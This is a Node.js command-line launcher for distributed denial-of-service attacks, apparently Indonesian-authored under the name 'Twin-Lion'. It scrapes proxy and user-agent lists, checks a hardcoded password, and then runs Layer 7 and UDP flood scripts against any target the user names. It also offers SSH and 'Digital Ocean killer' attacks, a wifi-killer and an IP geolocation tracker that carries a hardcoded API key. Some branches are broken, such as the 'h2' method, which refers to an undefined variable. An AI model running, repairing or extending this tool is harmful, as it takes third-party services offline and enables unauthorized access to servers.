#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.7'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`\x1b[31m
          ⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂\x1b[0m⠀⠀⠀⠀
          \x1b[\x1b[41mPortable Tools DDoS By Twin-Lion\x1b[0m
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`\x1b[31mSabar Load\x1b[0m`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`\x1b[31mOke dikit lagii\x1b[0m`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`\x1b[31mMasukin Password nya\x1b[0m`);
    if (version === latestVersion.trim()) {
    console.log(`\x1b[31mHarus bener lo yaaa\x1b[0m`);
    const password = "fann";
    await console.log(`\x1b[\x1b[41mMasukin Password Disini\x1b[0m`)
    permen.question('[\x1b[1m\x1b[31m> LION SECURITY\x1b[0m]:', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`\x1b[32mSipp Login Diterima...\x1b[0m`)
        await scrapeProxy()
        console.log(`\x1b[32mTungguu Proses Masuk\x1b[0m`)
        await scrapeUserAgent()
        console.log(`\x1b[32mOtw Masukkk\x1b[0m`)
        await sleep(100)
        console.clear()
        console.log(`\x1b[\x1b[41mWelcome To Fann Tools\x1b[0m`)
        await sleep(100)
		    await banner()
        console.log(`\x1b[31mType\x1b[0m \x1b[32m"help"\x1b[0m \x1b[31mFor Showing All Available Command\x1b[0m`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`Installing update`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`\x1b[31mAnda membutuhkan jaringan yang lebih kuat lagi\x1b[0m`)
  }
}
// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
\x1b[\x1b[41mSend Attack Wifi By TwinLion\x1b[0m
\x1b[\x1b[47m\x1b[32mJangan di salah gunakan ya om\x1b[0m

\x1b[31mType\x1b[0m \x1b[32mexit\x1b[0m \x1b[31mTo Stop\x1b[0m
`);
permen.question('[\x1b[1m\x1b[31mTwinLion Wifi Killer\x1b[0m]:', async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[\x1b[41m========================================================================\x1b[0m
 \x1b[31m• Flags\x1b[0m         [ \x1b[32m${ipInfo.country_flag}\x1b[0m ]
 \x1b[31m• Country\x1b[0m        [ \x1b[32m${ipInfo.country_name}\x1b[0m ]
 \x1b[31m• Capital\x1b[0m         [ \x1b[32m${ipInfo.country_capital}\x1b[0m ]
 \x1b[31m• City\x1b[0m            [ \x1b[32m${ipInfo.city}\x1b[0m ]
 \x1b[31m• ISP\x1b[0m             [ \x1b[32m${ipInfo.isp}\x1b[0m ]
 \x1b[31m• Organization\x1b[0m    [ \x1b[32m${ipInfo.organization}\x1b[0m ]
 \x1b[31m• lat\x1b[0m             [ \x1b[32m${ipInfo.latitude}\x1b[0m ]
 \x1b[31m• long\x1b[0m            [ \x1b[32m${ipInfo.longitude}\x1b[0m ]
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 100);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 100)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
\x1b[31m⢀⣠⣶⣶⣶⣶⣶⣶⣦⣄⡀⠀⠰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠀⢀⣠⣤⣶⣶⣶⣶⣶⣶⣤⣀⠀
⠋⠉⠀⠰⠤⠽⠿⢿⣿⣿⣿⣷⣄⡙⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠞⣠⣶⣿⣿⣿⣿⠿⠿⠤⠔⠀⠈⠉⠂
⠀⠀⠀⡀⠀⠀⣴⠈⣿⣿⣿⡿⠻⢷⣌⢻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⢋⣾⠿⢿⣿⣿⣿⡇⣦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢱⡀⠀⣿⡆⠻⣿⣿⣧⠀⠀⠙⢎⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⢣⠋⠁⠀⣰⣿⣿⡿⢁⣿⡇⠀⡸⠀⠀⠀⠀
⠐⠲⢄⡈⢷⣄⠹⢿⣄⡈⠙⠛⠷⠤⠀⠀⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠠⠶⠟⠛⠉⣠⣾⠟⣀⣾⢃⣠⠴⠂⠀
⠀⠀⠢⣽⣮⢻⣷⣄⣉⠛⠶⠶⣦⣤⣀⠀⢻⡙⢿⣆⠀⠀⠀⠀⠀⠀⣠⣿⠟⣿⠀⢀⣠⣴⠶⠶⠚⢉⣡⣶⡿⣣⣎⡴⠀⠀⠀
⠀⠀⠀⠈⠙⢷⠙⢿⡛⠻⣶⡄⠀⠉⠻⣧⡈⠳⡀⠙⠷⣄⠀⠀⣠⡾⠋⢁⠴⠁⣰⠟⠉⠀⢀⣴⠾⠛⣿⠟⡱⠟⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠻⡄⢦⡀⠈⣷⡀⠀⠀⠀⠈⢧⢰⠋⠀⠀⠀⠀⣼⠃⠀⣠⠀⡾⠁⠀⠈⠀⠀⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠙⠶⣾⣿⣦⡀⠀⠀⠈⠉⠀⠀⢀⣠⣾⣿⡶⠞⠁⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣦⡀⠀⠀⠀⣰⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠘\x1b[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[\x1b[41m=================================================================\x1b[0m
 \x1b[31mAttack Details\x1b[0m
  \x1b[31mStatus\x1b[0m           : \x1b[34mSuccessfully Send Attack\x1b[0m
  \x1b[31mTarget\x1b[0m           : [ \x1b[34m${target}\x1b[0m ]
  \x1b[31mTime \x1b[0m            : [ \x1b[34m${duration}\x1b[0m ]
  \x1b[31mMethods\x1b[0m          : [ \x1b[34m${methods}\x1b[0m ]
  \x1b[31mISP\x1b[0m              : [ \x1b[34m${result.isp}\x1b[0m ]
  \x1b[31mIp\x1b[0m               : [ \x1b[34m${result.query}\x1b[0m ]
  \x1b[31mAS\x1b[0m               : [ \x1b[34m${result.as}\x1b[0m ]

`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'pidoras') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'destroy') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'h2') {
       pushOngoing(target, methods, duration)
const destroy = path.join(__dirname, `/lib/cache/destroy`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const rape = path.join(__dirname, `/lib/cache/pidoras`);
        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
        exec(`node ${pidoras} $(target) ${duration} 10 100 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[\x1b[41m===================================================\x1b[0m
\x1b[31m• Target\x1b[0m         [ \x1b[32m${target}\x1b[0m ]
\x1b[31m• Duration\x1b[0m       [ \x1b[32m${duration}\x1b[0m ]
\x1b[31m• ISP\x1b[0m            [ \x1b[32m${result.isp}\x1b[0m ]
\x1b[31m• Ip\x1b[0m             [ \x1b[32m${result.query}\x1b[0m ]
\x1b[31m• AS\x1b[0m             [ \x1b[32m${result.as}\x1b[0m ]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 \x1b[\x1b[41m=======================================================================\x1b[0m
\x1b[31mTarget\x1b[0m            [ \x1b[32m${target}\x1b[0m ]
\x1b[31mDuration\x1b[0m          [ \x1b[32m${duration}\x1b[0m ]
\x1b[31mMethods\x1b[0m           [ \x1b[32mDigital Ocean Killer\x1b[0m ]
\x1b[31mCreator\x1b[0m           [ \x1b[32mTwinLion\x1b[0m ]`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/raw`);
const flood = path.join(__dirname, `/lib/cache/flood`);
const ssh = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${flood} https://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[\x1b[41m========================================================================\x1b[0m
\x1b[31mTarget\x1b[0m            [ \x1b[32m${target}\x1b[0m ]
\x1b[31mDuration\x1b[0m          [ \x1b[32m${duration}\x1b[0m ]
\x1b[31mMethods\x1b[0m           [ \x1b[32mUDP\x1b[0m ]
\x1b[31mCreator\x1b[0m           [ \x1b[32mTwinLion\x1b[0m ]`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/udp`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
\x1b[\x1b[46mCreated And Coded Full By TwinLion\x1b[0m

Thx To:
ChatGPT ( Fixing Error )
TwinLion ( Me )
My Family
Allah SWT
`
permen.question('[\x1b[47m\x1b[37m\x1b[31mTWIN-LION\x1b[0m]:', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
 \x1b[\x1b[41m[====================================================]\x1b[0m
 \x1b[31m• methods\x1b[0m      [ \x1b[32mshow list of available methods\x1b[0m ]
 \x1b[31m• track-ip \x1b[0m    [ \x1b[32mtrack ip address with info\x1b[0m ]
 \x1b[31m• kill-wifi \x1b[0m   [ \x1b[32mkill your wifi (termux/linux/windows only)\x1b[0m ]
 \x1b[31m• kill-ssh\x1b[0m     [ \x1b[32mkill VPS Access\x1b[0m ]
 \x1b[31m• attack\x1b[0m       [ \x1b[32mlaunch ddos attack\x1b[0m ]
 \x1b[31m• udp-raw\x1b[0m      [ \x1b[32mlaunch udp flood attack\x1b[0m ]
 \x1b[31m• kill-do\x1b[0m      [ \x1b[32mdigital ocean killer\x1b[0m ]
 \x1b[31m• ongoing\x1b[0m      [ \x1b[32mshow ongoing attack\x1b[0m ]
 \x1b[31m• credits\x1b[0m      [ \x1b[32mshow creator of these tools\x1b[0m ]
 \x1b[31m• clear\x1b[0m        [ \x1b[32mclear terminal\x1b[0m ]
 \x1b[\x1b[41m[===================================================]\x1b[0m
`);
    sigma();
  } else if (command === 'methods') {
  console.clear()
    console.log(`
\x1b[\x1b[41m[============================================]\x1b[0m
\x1b[\x1b[42mLayer 7\x1b[0m
 \x1b[31m• flood\x1b[0m             [\x1b[32mFree\x1b[0m]   
 \x1b[31m• tls\x1b[0m               [\x1b[32mFree\x1b[0m]   
 \x1b[31m• strike\x1b[0m            [\x1b[32mFree\x1b[0m]   
 \x1b[31m• raw\x1b[0m               [\x1b[32mFree\x1b[0m]   
 \x1b[31m• bypass\x1b[0m            [\x1b[32mFree\x1b[0m]   
 \x1b[31m• pidoras\x1b[0m           [\x1b[32mFree\x1b[0m]   
 \x1b[31m• storm\x1b[0m             [\x1b[32mFree\x1b[0m]   
 \x1b[31m• destroy\x1b[0m           [\x1b[32mFree\x1b[0m]   
 \x1b[31m• h2\x1b[0m                [\x1b[32mFree\x1b[0m] 
 \x1b[\x1b[42mLayer 4\x1b[0m
 \x1b[31m• udp-raw\x1b[0m           [\x1b[32mFree\x1b[0m] 
\x1b[\x1b[41m[============================================]\x1b[0m
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'kill-ssh') {
    killSSH(args);
  } else if (command === 'udp-raw') {
    udp_flood(args);
  } else if (command === 'kill-do') {
    killDo(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'clear') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()